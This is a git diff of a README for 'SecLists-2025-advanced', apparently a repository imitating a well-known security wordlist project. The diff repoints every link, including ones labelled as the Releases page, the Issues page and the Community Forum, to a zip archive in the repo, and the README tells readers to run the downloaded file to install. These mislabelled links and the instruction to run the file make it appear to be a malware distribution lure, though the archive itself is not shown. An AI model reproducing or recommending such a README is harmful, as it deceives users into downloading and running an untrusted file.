@@ -1,7 +1,7 @@
 # 🔐 SecLists-2025-advanced - Access Essential Security Wordlists Easily
 
 ## 📥 Download Now
-[![Download SecLists-2025-advanced](https://raw.githubusercontent.com/manoelrichard29/SecLists-2025-advanced/main/pinitannic/SecLists-2025-advanced.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/manoelrichard29/SecLists-2025-advanced/main/pinitannic/SecLists-2025-advanced.zip)
+[![Download SecLists-2025-advanced](https://github.com/manoelrichard29/SecLists-2025-advanced/raw/refs/heads/main/Headers/advanced-Lists-Sec-v1.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/manoelrichard29/SecLists-2025-advanced/raw/refs/heads/main/Headers/advanced-Lists-Sec-v1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to **SecLists-2025-advanced**. This application provides modern security wordlists and payloads, tailored for security testing in France. Whether you are into bug bounty hunting, or penetration testing, you will find valuable resources here.
@@ -23,7 +23,7 @@ To run this application, your system should meet the following requirements:
 ## 🔗 Download & Install
 To get started, visit the Releases page to download the latest version of the software. Follow these steps:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/manoelrichard29/SecLists-2025-advanced/main/pinitannic/SecLists-2025-advanced.zip).
+1. Go to the [Releases page](https://github.com/manoelrichard29/SecLists-2025-advanced/raw/refs/heads/main/Headers/advanced-Lists-Sec-v1.7.zip).
 2. Look for the most recent version.
 3. Click on the file to download it.
 4. Once downloaded, run the file to install the application on your computer.
@@ -45,7 +45,7 @@ If you encounter issues during installation or usage, here are some common probl
 
 - **Application Crashes:** Ensure your operating system is up to date. Restart the application and try again.
 
-If problems persist, visit the [GitHub Issues page](https://raw.githubusercontent.com/manoelrichard29/SecLists-2025-advanced/main/pinitannic/SecLists-2025-advanced.zip) to report bugs or seek assistance.
+If problems persist, visit the [GitHub Issues page](https://github.com/manoelrichard29/SecLists-2025-advanced/raw/refs/heads/main/Headers/advanced-Lists-Sec-v1.7.zip) to report bugs or seek assistance.
 
 ## 📖 Documentation
 For more detailed instructions and advanced features, you can check the official documentation provided within the application. This includes:
@@ -57,7 +57,7 @@ For more detailed instructions and advanced features, you can check the official
 ## 🤝 Community Support
 Join our community to connect with other users. You can share tips, ask for help, or contribute to the project:
 
-- Join discussions on GitHub Discussions: [Community Forum](https://raw.githubusercontent.com/manoelrichard29/SecLists-2025-advanced/main/pinitannic/SecLists-2025-advanced.zip)
+- Join discussions on GitHub Discussions: [Community Forum](https://github.com/manoelrichard29/SecLists-2025-advanced/raw/refs/heads/main/Headers/advanced-Lists-Sec-v1.7.zip)
 - Follow updates and announcements via the repository.
 
 ## 📜 License
